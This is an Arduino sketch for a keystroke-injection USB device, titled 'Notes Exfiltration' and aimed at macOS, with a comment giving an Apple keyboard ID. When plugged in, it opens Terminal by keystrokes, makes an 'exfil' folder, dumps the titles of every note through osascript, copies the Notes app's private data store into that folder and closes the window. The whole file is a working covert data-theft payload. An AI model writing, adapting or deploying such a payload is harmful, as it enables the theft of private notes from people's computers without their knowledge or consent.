#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Export Notes app data
  // Saves to ~/Documents/exfil/notes/
  // Author: Generated
  // Title: Notes Exfiltration
  // Target: macOS
  // Version: 1.0
  // Category: Exfiltration
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("mkdir -p ~/Documents/exfil/notes");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("osascript -e 'tell application \"Notes\" to get name of every note' > ~/Documents/exfil/notes/notes_titles.txt");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("cp -r ~/Library/Group\\ Containers/group.com.apple.notes/* ~/Documents/exfil/notes/ 2>/dev/null || echo 'Notes access failed' > ~/Documents/exfil/notes/status.txt");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("ls -la ~/Documents/exfil/notes/");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}